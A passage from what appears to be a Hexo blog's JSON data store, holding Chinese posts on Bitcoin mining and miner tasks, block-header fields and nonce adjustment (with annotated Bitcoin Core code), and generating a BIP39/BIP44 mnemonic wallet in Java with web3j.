work)。工作量证明的理念是把随机选取节点记账改为根据算力来选取节点，任何一个提议并创建区块的节点要想构建下一个区块，必须找到一个解，当把这个解与前区块的哈希值、当前时间戳、区块包含交易集合唯一标识MerkleRoot等组装起来，带入哈希函数时，刚好小于指定的目标值，这一系列操作就称为“挖矿\"，而进行挖矿的人则被称为\"矿工\"。\n\n## 矿工任务\n考虑到矿工记账的积极性，中本聪在比特币系统中，设计了两种奖励，一是区块奖励，初始为每挖到一个区块奖励50个比特币，每四年递减一次，到2040年左右发放完毕，总量约为2100万个，而这也是比特币系统产生新币的唯一来源。二是交易手续费，区块中所包含交易的所有交易手续费都归成功打包该区块的矿工所得，交易手续费的重要性随着区块奖励的减少会逐渐提升，最终完全取代区块奖励，成为比特币系统刺激矿工挖矿的唯一物质激励。那么矿工作为淘金者，都需要做哪些工作呢？要想成为比特币矿工，首先要加入比特币网络并与其他节点相连，建立连接后，还有如下任务要完成：\n1、同步区块链已有数据，监听新区块。比特币系统默认最长链作为系统主链，因此只有在已有最长链的基础上打包区块，才可能得到大家的认可。\n2、监听交易广播。监听网络上的交易广播，验证交易签名是否有效，是否存在双花，付款地址有没有足够的余额，验证通过，放入交易池。\n3、构建coinbase交易，组装新区块。coinbase交易为矿工自行构建，用以接收挖矿奖励。矿工应以全网最长链上的最后一个区块为基础构建新区块。\n4、找到让区块满足要求的随机数。工作量证明就体现在这一步，最为耗时。\n5、广播新区块。为了获得区块奖励和交易手续费，矿工在成功打包新区块后，会在第一时间向全网广播，因为网络延迟，所以存在相近时间不同矿工成功打包出不同区块的情况，这时便会出现软分叉，只有被大部分矿工所接受，新区块才算真正加入区块链。\n\n## 区块头BlockHeader\n挖矿的本质是执行Hash函数，而Hash函数是一个单向函数，一个输入对应一个输出，根据输入可以很容易计算出输出，但根据输出无法逆推出输入。当输出小于目标值值，便可认为一次挖矿成功，而这里输入数据就是区块头。比特币的区块头有如下6个字段：\n```\nint32_t nVersion;            //版本号，4字节\nuint256 hashPrevBlock;       //前一个区块的hash值，32字节\nuint256 hashMerkleRoot;      //根据区块所包含交易构建的Merkle树根，32字节\nuint32_t nTime;              //Uinx时间戳，4字节\nuint32_t nBits;              //难度的压缩表示，4字节\nuint32_t nNonce;             //随机数，4字节\n```\n比特币挖矿就是对区块头的80个字节进行两次SHA256运算，得到32字节的数据，使之满足nBits转化出来的目标值。可用如下公式表示：\n```\nSHA256(SHA256(nVersion+hashPrevBlock+hashMerkleRoot+nTime+nBits+nNonce))<F(nBits)\n```\n关于区块头BlockHeader各字段的具体含义将在接下来的文章具体介绍。\n","slug":"比特币挖矿之矿工任务","published":1,"updated":"2018-03-09T09:54:45.402Z","layout":"post","photos":[],"link":"","_id":"cjf7piaw80021pkwo2nstrogm","content":"<h2 id=\"挖矿介绍\"><a href=\"#挖矿介绍\" class=\"headerlink\" title=\"挖矿介绍\"></a>挖矿介绍</h2><p>中本聪为了实现比特币的去中心化，引入了工作量证明机制(proof of work)。工作量证明的理念是把随机选取节点记账改为根据算力来选取节点，任何一个提议并创建区块的节点要想构建下一个区块，必须找到一个解，当把这个解与前区块的哈希值、当前时间戳、区块包含交易集合唯一标识MerkleRoot等组装起来，带入哈希函数时，刚好小于指定的目标值，这一系列操作就称为“挖矿”，而进行挖矿的人则被称为”矿工”。</p>\n<h2 id=\"矿工任务\"><a href=\"#矿工任务\" class=\"headerlink\" title=\"矿工任务\"></a>矿工任务</h2><p>考虑到矿工记账的积极性，中本聪在比特币系统中，设计了两种奖励，一是区块奖励，初始为每挖到一个区块奖励50个比特币，每四年递减一次，到2040年左右发放完毕，总量约为2100万个，而这也是比特币系统产生新币的唯一来源。二是交易手续费，区块中所包含交易的所有交易手续费都归成功打包该区块的矿工所得，交易手续费的重要性随着区块奖励的减少会逐渐提升，最终完全取代区块奖励，成为比特币系统刺激矿工挖矿的唯一物质激励。那么矿工作为淘金者，都需要做哪些工作呢？要想成为比特币矿工，首先要加入比特币网络并与其他节点相连，建立连接后，还有如下任务要完成：<br>1、同步区块链已有数据，监听新区块。比特币系统默认最长链作为系统主链，因此只有在已有最长链的基础上打包区块，才可能得到大家的认可。<br>2、监听交易广播。监听网络上的交易广播，验证交易签名是否有效，是否存在双花，付款地址有没有足够的余额，验证通过，放入交易池。<br>3、构建coinbase交易，组装新区块。coinbase交易为矿工自行构建，用以接收挖矿奖励。矿工应以全网最长链上的最后一个区块为基础构建新区块。<br>4、找到让区块满足要求的随机数。工作量证明就体现在这一步，最为耗时。<br>5、广播新区块。为了获得区块奖励和交易手续费，矿工在成功打包新区块后，会在第一时间向全网广播，因为网络延迟，所以存在相近时间不同矿工成功打包出不同区块的情况，这时便会出现软分叉，只有被大部分矿工所接受，新区块才算真正加入区块链。</p>\n<h2 id=\"区块头BlockHeader\"><a href=\"#区块头BlockHeader\" class=\"headerlink\" title=\"区块头BlockHeader\"></a>区块头BlockHeader</h2><p>挖矿的本质是执行Hash函数，而Hash函数是一个单向函数，一个输入对应一个输出，根据输入可以很容易计算出输出，但根据输出无法逆推出输入。当输出小于目标值值，便可认为一次挖矿成功，而这里输入数据就是区块头。比特币的区块头有如下6个字段：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int32_t nVersion;            //版本号，4字节</span><br><span class=\"line\">uint256 hashPrevBlock;       //前一个区块的hash值，32字节</span><br><span class=\"line\">uint256 hashMerkleRoot;      //根据区块所包含交易构建的Merkle树根，32字节</span><br><span class=\"line\">uint32_t nTime;              //Uinx时间戳，4字节</span><br><span class=\"line\">uint32_t nBits;              //难度的压缩表示，4字节</span><br><span class=\"line\">uint32_t nNonce;             //随机数，4字节</span><br></pre></td></tr></table></figure></p>\n<p>比特币挖矿就是对区块头的80个字节进行两次SHA256运算，得到32字节的数据，使之满足nBits转化出来的目标值。可用如下公式表示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SHA256(SHA256(nVersion+hashPrevBlock+hashMerkleRoot+nTime+nBits+nNonce))&lt;F(nBits)</span><br></pre></td></tr></table></figure></p>\n<p>关于区块头BlockHeader各字段的具体含义将在接下来的文章具体介绍。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"挖矿介绍\"><a href=\"#挖矿介绍\" class=\"headerlink\" title=\"挖矿介绍\"></a>挖矿介绍</h2><p>中本聪为了实现比特币的去中心化，引入了工作量证明机制(proof of work)。工作量证明的理念是把随机选取节点记账改为根据算力来选取节点，任何一个提议并创建区块的节点要想构建下一个区块，必须找到一个解，当把这个解与前区块的哈希值、当前时间戳、区块包含交易集合唯一标识MerkleRoot等组装起来，带入哈希函数时，刚好小于指定的目标值，这一系列操作就称为“挖矿”，而进行挖矿的人则被称为”矿工”。</p>\n<h2 id=\"矿工任务\"><a href=\"#矿工任务\" class=\"headerlink\" title=\"矿工任务\"></a>矿工任务</h2><p>考虑到矿工记账的积极性，中本聪在比特币系统中，设计了两种奖励，一是区块奖励，初始为每挖到一个区块奖励50个比特币，每四年递减一次，到2040年左右发放完毕，总量约为2100万个，而这也是比特币系统产生新币的唯一来源。二是交易手续费，区块中所包含交易的所有交易手续费都归成功打包该区块的矿工所得，交易手续费的重要性随着区块奖励的减少会逐渐提升，最终完全取代区块奖励，成为比特币系统刺激矿工挖矿的唯一物质激励。那么矿工作为淘金者，都需要做哪些工作呢？要想成为比特币矿工，首先要加入比特币网络并与其他节点相连，建立连接后，还有如下任务要完成：<br>1、同步区块链已有数据，监听新区块。比特币系统默认最长链作为系统主链，因此只有在已有最长链的基础上打包区块，才可能得到大家的认可。<br>2、监听交易广播。监听网络上的交易广播，验证交易签名是否有效，是否存在双花，付款地址有没有足够的余额，验证通过，放入交易池。<br>3、构建coinbase交易，组装新区块。coinbase交易为矿工自行构建，用以接收挖矿奖励。矿工应以全网最长链上的最后一个区块为基础构建新区块。<br>4、找到让区块满足要求的随机数。工作量证明就体现在这一步，最为耗时。<br>5、广播新区块。为了获得区块奖励和交易手续费，矿工在成功打包新区块后，会在第一时间向全网广播，因为网络延迟，所以存在相近时间不同矿工成功打包出不同区块的情况，这时便会出现软分叉，只有被大部分矿工所接受，新区块才算真正加入区块链。</p>\n<h2 id=\"区块头BlockHeader\"><a href=\"#区块头BlockHeader\" class=\"headerlink\" title=\"区块头BlockHeader\"></a>区块头BlockHeader</h2><p>挖矿的本质是执行Hash函数，而Hash函数是一个单向函数，一个输入对应一个输出，根据输入可以很容易计算出输出，但根据输出无法逆推出输入。当输出小于目标值值，便可认为一次挖矿成功，而这里输入数据就是区块头。比特币的区块头有如下6个字段：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int32_t nVersion;            //版本号，4字节</span><br><span class=\"line\">uint256 hashPrevBlock;       //前一个区块的hash值，32字节</span><br><span class=\"line\">uint256 hashMerkleRoot;      //根据区块所包含交易构建的Merkle树根，32字节</span><br><span class=\"line\">uint32_t nTime;              //Uinx时间戳，4字节</span><br><span class=\"line\">uint32_t nBits;              //难度的压缩表示，4字节</span><br><span class=\"line\">uint32_t nNonce;             //随机数，4字节</span><br></pre></td></tr></table></figure></p>\n<p>比特币挖矿就是对区块头的80个字节进行两次SHA256运算，得到32字节的数据，使之满足nBits转化出来的目标值。可用如下公式表示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SHA256(SHA256(nVersion+hashPrevBlock+hashMerkleRoot+nTime+nBits+nNonce))&lt;F(nBits)</span><br></pre></td></tr></table></figure></p>\n<p>关于区块头BlockHeader各字段的具体含义将在接下来的文章具体介绍。</p>\n"},{"title":"生成助记词钱包","comments":0,"date":"2018-03-25T15:58:04.000Z","img":null,"_content":"刚开始对助记词有一个误解一直认为是助记词是从私钥生成的，私钥生成它导出助记词，助记词然后反向回去生成私钥。\n\n今天单拿出来研究，才发现正确的流程应该是这样的\n\n![image](/images/bip201803252337.jpg)\n\n（图片来《自精通比特币（第二版）》）\n\n1. 随机生成一个128位的熵，然后把熵转为12个单词(参考BIP39)\n\n```\nbyte[] random = new byte[128/8];\nnew SecureRandom().nextBytes(random);\nMnemonicCode mnemonicCode = new MnemonicCode();\nList<String> strings = mnemonicCode.toMnemonic(random);\n```\n![image](/images/bip201803252339.jpg)\n\n2. 然后通过助记词生成一个种子(参考BIP39)\n\n```\nbyte[] seed = MnemonicCode.toSeed(strings, \"\");\n```\n3. 将种子生成一个公钥私钥（参考BIP32,BIP44）\n\n```\nAddressIndex address = BIP44.m().purpose44()\n        .coinType(60)\n        .account(0)\n        .external()\n        .address(0);\nCoinPairDerive coinKeyPair = new CoinPairDerive(extendedKey);\nExtendedKey child = coinKeyPair.deriveByExtendedKey(address);\nbyte[] privateKey = child.getMaster().getPrivate();\n```\n既然有了公钥私钥。那么钱包生成不就是简单一下钱包的构造方法不就出来了吗？（参考Web3j）\n\n```\nECKeyPair  ecKeyPair = ECKeyPair.create(privateKey);\nCredentials credentials = Credentials.create(ecKeyPair);\nLog.e(\"私钥\",Numeric.toHexStringWithPrefix(credentials.getEcKeyPair().getPrivateKey()));\nLog.e(\"地址\",credentials.getAddress());\n```\n查看结果并导入imtoken对比\n\n![image](/images/bip201803252342.jpg)\n\n![image](/images/bip201803252344.jpg)\n\n","source":"_posts/生成助记词钱包.md","raw":"---\ntitle: 生成助记词钱包\ncomments: false\ndate: 2018-03-25 23:58:04\ncategories: 钱包\ntags:\n- ciscolxh\n- 钱包\nimg:\n---\n刚开始对助记词有一个误解一直认为是助记词是从私钥生成的，私钥生成它导出助记词，助记词然后反向回去生成私钥。\n\n今天单拿出来研究，才发现正确的流程应该是这样的\n\n![image](/images/bip201803252337.jpg)\n\n（图片来《自精通比特币（第二版）》）\n\n1. 随机生成一个128位的熵，然后把熵转为12个单词(参考BIP39)\n\n```\nbyte[] random = new byte[128/8];\nnew SecureRandom().nextBytes(random);\nMnemonicCode mnemonicCode = new MnemonicCode();\nList<String> strings = mnemonicCode.toMnemonic(random);\n```\n![image](/images/bip201803252339.jpg)\n\n2. 然后通过助记词生成一个种子(参考BIP39)\n\n```\nbyte[] seed = MnemonicCode.toSeed(strings, \"\");\n```\n3. 将种子生成一个公钥私钥（参考BIP32,BIP44）\n\n```\nAddressIndex address = BIP44.m().purpose44()\n        .coinType(60)\n        .account(0)\n        .external()\n        .address(0);\nCoinPairDerive coinKeyPair = new CoinPairDerive(extendedKey);\nExtendedKey child = coinKeyPair.deriveByExtendedKey(address);\nbyte[] privateKey = child.getMaster().getPrivate();\n```\n既然有了公钥私钥。那么钱包生成不就是简单一下钱包的构造方法不就出来了吗？（参考Web3j）\n\n```\nECKeyPair  ecKeyPair = ECKeyPair.create(privateKey);\nCredentials credentials = Credentials.create(ecKeyPair);\nLog.e(\"私钥\",Numeric.toHexStringWithPrefix(credentials.getEcKeyPair().getPrivateKey()));\nLog.e(\"地址\",credentials.getAddress());\n```\n查看结果并导入imtoken对比\n\n![image](/images/bip201803252342.jpg)\n\n![image](/images/bip201803252344.jpg)\n\n","slug":"生成助记词钱包","published":1,"updated":"2018-03-25T16:01:23.138Z","layout":"post","photos":[],"link":"","_id":"cjf7piawa0025pkwog3vvefje","content":"<p>刚开始对助记词有一个误解一直认为是助记词是从私钥生成的，私钥生成它导出助记词，助记词然后反向回去生成私钥。</p>\n<p>今天单拿出来研究，才发现正确的流程应该是这样的</p>\n<p><img src=\"/images/bip201803252337.jpg\" alt=\"image\"></p>\n<p>（图片来《自精通比特币（第二版）》）</p>\n<ol>\n<li>随机生成一个128位的熵，然后把熵转为12个单词(参考BIP39)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byte[] random = new byte[128/8];</span><br><span class=\"line\">new SecureRandom().nextBytes(random);</span><br><span class=\"line\">MnemonicCode mnemonicCode = new MnemonicCode();</span><br><span class=\"line\">List&lt;String&gt; strings = mnemonicCode.toMnemonic(random);</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/bip201803252339.jpg\" alt=\"image\"></p>\n<ol>\n<li>然后通过助记词生成一个种子(参考BIP39)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byte[] seed = MnemonicCode.toSeed(strings, &quot;&quot;);</span><br></pre></td></tr></table></figure>\n<ol>\n<li>将种子生成一个公钥私钥（参考BIP32,BIP44）</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AddressIndex address = BIP44.m().purpose44()</span><br><span class=\"line\">        .coinType(60)</span><br><span class=\"line\">        .account(0)</span><br><span class=\"line\">        .external()</span><br><span class=\"line\">        .address(0);</span><br><span class=\"line\">CoinPairDerive coinKeyPair = new CoinPairDerive(extendedKey);</span><br><span class=\"line\">ExtendedKey child = coinKeyPair.deriveByExtendedKey(address);</span><br><span class=\"line\">byte[] privateKey = child.getMaster().getPrivate();</span><br></pre></td></tr></table></figure>\n<p>既然有了公钥私钥。那么钱包生成不就是简单一下钱包的构造方法不就出来了吗？（参考Web3j）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ECKeyPair  ecKeyPair = ECKeyPair.create(privateKey);</span><br><span class=\"line\">Credentials credentials = Credentials.create(ecKeyPair);</span><br><span class=\"line\">Log.e(&quot;私钥&quot;,Numeric.toHexStringWithPrefix(credentials.getEcKeyPair().getPrivateKey()));</span><br><span class=\"line\">Log.e(&quot;地址&quot;,credentials.getAddress());</span><br></pre></td></tr></table></figure>\n<p>查看结果并导入imtoken对比</p>\n<p><img src=\"/images/bip201803252342.jpg\" alt=\"image\"></p>\n<p><img src=\"/images/bip201803252344.jpg\" alt=\"image\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p>刚开始对助记词有一个误解一直认为是助记词是从私钥生成的，私钥生成它导出助记词，助记词然后反向回去生成私钥。</p>\n<p>今天单拿出来研究，才发现正确的流程应该是这样的</p>\n<p><img src=\"/images/bip201803252337.jpg\" alt=\"image\"></p>\n<p>（图片来《自精通比特币（第二版）》）</p>\n<ol>\n<li>随机生成一个128位的熵，然后把熵转为12个单词(参考BIP39)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byte[] random = new byte[128/8];</span><br><span class=\"line\">new SecureRandom().nextBytes(random);</span><br><span class=\"line\">MnemonicCode mnemonicCode = new MnemonicCode();</span><br><span class=\"line\">List&lt;String&gt; strings = mnemonicCode.toMnemonic(random);</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/bip201803252339.jpg\" alt=\"image\"></p>\n<ol>\n<li>然后通过助记词生成一个种子(参考BIP39)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byte[] seed = MnemonicCode.toSeed(strings, &quot;&quot;);</span><br></pre></td></tr></table></figure>\n<ol>\n<li>将种子生成一个公钥私钥（参考BIP32,BIP44）</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AddressIndex address = BIP44.m().purpose44()</span><br><span class=\"line\">        .coinType(60)</span><br><span class=\"line\">        .account(0)</span><br><span class=\"line\">        .external()</span><br><span class=\"line\">        .address(0);</span><br><span class=\"line\">CoinPairDerive coinKeyPair = new CoinPairDerive(extendedKey);</span><br><span class=\"line\">ExtendedKey child = coinKeyPair.deriveByExtendedKey(address);</span><br><span class=\"line\">byte[] privateKey = child.getMaster().getPrivate();</span><br></pre></td></tr></table></figure>\n<p>既然有了公钥私钥。那么钱包生成不就是简单一下钱包的构造方法不就出来了吗？（参考Web3j）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ECKeyPair  ecKeyPair = ECKeyPair.create(privateKey);</span><br><span class=\"line\">Credentials credentials = Credentials.create(ecKeyPair);</span><br><span class=\"line\">Log.e(&quot;私钥&quot;,Numeric.toHexStringWithPrefix(credentials.getEcKeyPair().getPrivateKey()));</span><br><span class=\"line\">Log.e(&quot;地址&quot;,credentials.getAddress());</span><br></pre></td></tr></table></figure>\n<p>查看结果并导入imtoken对比</p>\n<p><img src=\"/images/bip201803252342.jpg\" alt=\"image\"></p>\n<p><img src=\"/images/bip201803252344.jpg\" alt=\"image\"></p>\n"},{"title":"比特币挖矿之随机数","comments":0,"date":"2018-03-02T08:11:51.000Z","img":null,"_content":"\n## 比特币区块头字段分析\n在[比特币挖矿之矿工任务](https://xingyunbite.github.io/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/)中已经提到矿工的工作量主要就消耗在寻找使区块满足要求的随机数这一步。在比特币区块头的6个字段中，区块版本号nVersion只有在升级的时候才会改变。上一个区块Hash值hashPrevBlock在矿工不想制造软分叉的情况下，由最长链的最后一个区块决定。全网难度压缩表示[nBits](https://xingyunbite.github.io/2018/02/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E5%85%A8%E7%BD%91%E9%9A%BE%E5%BA%A6/)由全网决定,每2016个区块重新调整一次，调整算法固定。上述三个字段对于每个矿工来说，可以理解为固定的。随机数nNonce即我们要找的解，因其字段大小为4字节，32位，因此存在2^32种可能。打包时间nTime可调整的范围根据前一个区块时间来决定，比上一个区块太超前或者太落后会被其他节点拒绝，一般情况下，矿工会直接使用机器当前时间戳。Merkle树根hashMerkleRoot，因其字段长度为256位，理论上存在2^256种可能，本字段的变化主要在于修改CoinBase交易的输入字段，CoinBase交易的改变会传导到至hashMerkleRoot。根据Hash函数特性，nNonce、nTime、hashMerkleRoot任意改变一个，都会导致区块头Hash值结果产生巨大变化。\n\n## 随机数调整\n比特币挖矿的修改主要是体现在调整随机数nNonce上，但是随着算力的不断增长，2^32的调整空间已经很难满足求解的需要，因此比特币采取的处理方式是当遍历完2^32个随机数空间后，调整CoinBase的输入字段，致使hashMerkleRoot改变，再次遍历随机数空间，直到发现满足要求的解为止。当然正常情况下，矿工无法遍历完所有的调整空间(2^256 * 2^32)。下面主要以分析代码的方式展示随机数的调整机制。\n[构建区块头函数](https://github.com/bitcoin/bitcoin/blob/fd65937ec601326b479654a5ad14847adcdb214c/src/rpc/mining.cpp#L106)\n```\nUniValue generateBlocks(std::shared_ptr<CReserveScript> coinbaseScript, int nGenerate, uint64_t nMaxTries, bool keepScript)\n{\n\t// 内循环次数上限 nNonce的调整空间[0,2^16)\n\tstatic const int nInnerLoopCount = 0x10000;\n\tint nHeightEnd = 0;\n\tint nHeight = 0;\n\n\t{   // Don't keep cs_main locked\n\t\tLOCK(cs_main);\n\t\t// 区块当前高度\n\t\tnHeight = chainActive.Height();\n\t\t// 待生成区块高度\n\t\tnHeightEnd = nHeight+nGenerate;\n\t}\n\t// nExtraNonce 为CoinBase交易输入部分\n\tunsigned int nExtraNonce = 0;\n\tUniValue blockHashes(UniValue::VARR);\n\t// 循环生成区块，直到达到指定高度\n\twhile (nHeight < nHeightEnd)\n\t{\n\t\t// 创建区块模板\n\t\tstd::unique_ptr<CBlockTemplate> pblocktemplate(BlockAssembler(Params()).CreateNewBlock(coinbaseScript->reserveScript));\n\t\tif (!pblocktemplate.get())\n\t\t  throw JSONRPCError(RPC_INTERNAL_ERROR, \"Couldn't create new block\");\n\t\t// pblock 待构建区块\n\t\tCBlock *pblock = &pblocktemplate->block;\n\t\t{\n\t\t\tLOCK(cs_main);\n\t\t\t// 调整CoinBase输入脚本中的nExtranNonce\n\t\t\tIncrementExtraNonce(pblock, chainActive.Tip(), nExtraNonce);\n\t\t}\n\t\t// pblock->nNonce < nInnerLoopCount 区块头随机数调整次数不能超过nInnerLooCount\n\t\t// CheckProofOfWork(pblock->GetHash(),pblock->nBits,Params().GetConsensus()) 校验当前区块头Hash值是否满足要求\n\t\twhile (nMaxTries > 0 && pblock->nNonce < nInnerLoopCount &&!CheckProofOfWork(pblock->GetHash(), pblock->nBits,Params().GetConsensus())) {\n\t\t\t// nNonce++\n\t\t\t++pblock->nNonce;\n\t\t\t--nMaxTries;\n\t\t}\n\t\t// 超过最大尝试次数，退出循环\n\t\tif (nMaxTries == 0) {\n\t\t\tbreak;\n\t\t}\n\t\t// 达到内循环次数上限，调整CoinBase交易的nExtraNonce，重新开始循环\n\t\tif (pblock->nNonce == nInnerLoopCount) {\n\t\t\tcontinue;\n\t\t}\n\t\tstd::shared_ptr<const CBlock> shared_pblock = std::make_shared<const CBlock>(*pblock);\n\t\t// 处理挖到的区块\n\t\tif (!ProcessNewBlock(Params(), shared_pblock, true, nullptr))\n\t\t    throw JSONRPCError(RPC_INTERNAL_ERROR, \"ProcessNewBlock, block not accepted\");\n\t\t++nHeight;\n\t\t// 存放区块头Hash\n\t\tblockHashes.push_back(pblock->GetHash().GetHex());\n\n\t\t//mark script as important because it was used at least for one coinbase output if the script came from the wallet\n\t\tif (keepScript)\n\t\t{\n\t\t\tcoinbaseScript->KeepScript();\n\t\t}\n\t}\n\treturn blockHashes;\n}\n```\n[校验工作量函数](https://github.com/bitcoin/bitcoin/blob/5961b23898ee7c0af2626c46d5d70e80136578d3/src/pow.cpp#L74)\n```\nbool CheckProofOfWork(uint256 hash, unsigned int nBits, const Consensus::Params& params)\n{\n\tbool fNegative;\n\tbool fOverflow;\n\tarith_uint256 bnTarget;\n\n\tbnTarget.SetCompact(nBits, &fNegative, &fOverflow);\n\n\t// Check range\n\tif (fNegative || bnTarget == 0 || fOverflow || bnTarget > UintToArith256(params.powLimit))\n\t  return false;\n\n\t// Check proof of work matches claimed amount\n\t// 比较区块头hash值是否满足目标值\n\tif (UintToArith256(hash) > bnTarget)\n\t    return false;\n\n\treturn true;\n}\n```\n[调整CoinBase输入字段函数](https://github.com/bitcoin/bitcoin/blob/44080a90a29292df96e92f22242785c5040000a1/src/miner.cpp#L442)\n```\nvoid IncrementExtraNonce(CBlock* pblock, const CBlockIndex* pindexPrev,unsigned int& nExtraNonce)\n{\n\t// Update nExtraNonce\n\tstatic uint256 hashPrevBlock;\n\tif (hashPrevBlock != pblock->hashPrevBlock)\n\t{\n\t\tnExtraNonce = 0;\n\t\thashPrevBlock = pblock->hashPrevBlock;\n\t}\n\t// nExtranNonce调整\n\t++nExtraNonce;\n\t// 正在打包的区块高度从版本2开始，要求coinbase交易的输入脚本以本区块高度开头\n\tunsigned int nHeight = pindexPrev->nHeight+1; // Height first in coinbase required for block.version=2\n\tCMutableTransaction txCoinbase(*pblock->vtx[0]);\n\t// 构建coinbase交易的输入脚本\n\ttxCoinbase.vin[0].scriptSig = (CScript() << nHeight << CScriptNum(nExtraNonce)) + COINBASE_FLAGS;\n\tassert(txCoinbase.vin[0].scriptSig.size() <= 100);\n\n\tpblock->vtx[0] = MakeTransactionRef(std::move(txCoinbase));\n\t// 重新构建Merkle数，计算MerkleRoot\n\tpblock->hashMerkleRoot = BlockMerkleRoot(*pblock);\n}\n```\n","source":"_posts/比特币挖矿之随机数.md","raw":"---\ntitle: 比特币挖矿之随机数\ncomments: false\ndate: 2018-03-02 16:11:51\ncategories: 矿池\ntags: \n- LeonBCK \n- 比特币 \n- 矿池\nimg:\n---\n\n## 比特币区块头字段分析\n在[比特币挖矿之矿工任务](https://xingyunbite.github.io/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/)中已经提到矿工的工作量主要就消耗在寻找使区块满足要求的随机数这一步。在比特币区块头的6个字段中，区块版本号nVersion只有在升级的时候才会改变。上一个区块Hash值hashPrevBlock在矿工不想制造软分叉的情况下，由最长链的最后一个区块决定。全网难度压缩表示[nBits](https://xingyunbite.github.io/2018/02/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E5%85%A8%E7%BD%91%E9%9A%BE%E5%BA%A6/)由全网决定,每2016个区块重新调整一次，调整算法固定。上述三个字段对于每个矿工来说，可以理解为固定的。随机数nNonce即我们要找的解，因其字段大小为4字节，32位，因此存在2^32种可能。打包时间nTime可调整的范围根据前一个区块时间来决定，比上一个区块太超前或者太落后会被其他节点拒绝，一般情况下，矿工会直接使用机器当前时间戳。Merkle树根hashMerkleRoot，因其字段长度为256位，理论上存在2^256种可能，本字段的变化主要在于修改CoinBase交易的输入字段，CoinBase交易的改变会传导到至hashMerkleRoot。根据Hash函数特性，nNonce、nTime、hashMerkleRoot任意改变一个，都会导致区块头Hash值结果产生巨大变化。\n\n## 随机数调整\n比特币挖矿的修改主要是体现在调整随机数nNonce上，但是随着算力的不断增长，2^32的调整空间已经很难满足求解的需要，因此比特币采取的处理方式是当遍历完2^32个随机数空间后，调整CoinBase的输入字段，致使hashMerkleRoot改变，再次遍历随机数空间，直到发现满足要求的解为止。当然正常情况下，矿工无法遍历完所有的调整空间(2^256 * 2^32)。下面主要以分析代码的方式展示随机数的调整机制。\n[构建区块头函数](https://github.com/bitcoin/bitcoin/blob/fd65937ec601326b479654a5ad14847adcdb214c/src/rpc/mining.cpp#L106)\n```\nUniValue generateBlocks(std::shared_ptr<CReserveScript> coinbaseScript, int nGenerate, uint64_t nMaxTries, bool keepScript)\n{\n\t// 内循环次数上限 nNonce的调整空间[0,2^16)\n\tstatic const int nInnerLoopCount = 0x10000;\n\tint nHeightEnd = 0;\n\tint nHeight = 0;\n\n\t{   // Don't keep cs_main locked\n\t\tLOCK(cs_main);\n\t\t// 区块当前高度\n\t\tnHeight = chainActive.Height();\n\t\t// 待生成区块高度\n\t\tnHeightEnd = nHeight+nGenerate;\n\t}\n\t// nExtraNonce 为CoinBase交易输入部分\n\tunsigned int nExtraNonce = 0;\n\tUniValue blockHashes(UniValue::VARR);\n\t// 循环生成区块，直到达到指定高度\n\twhile (nHeight < nHeightEnd)\n\t{\n\t\t// 创建区块模板\n\t\tstd::unique_ptr<CBlockTemplate> 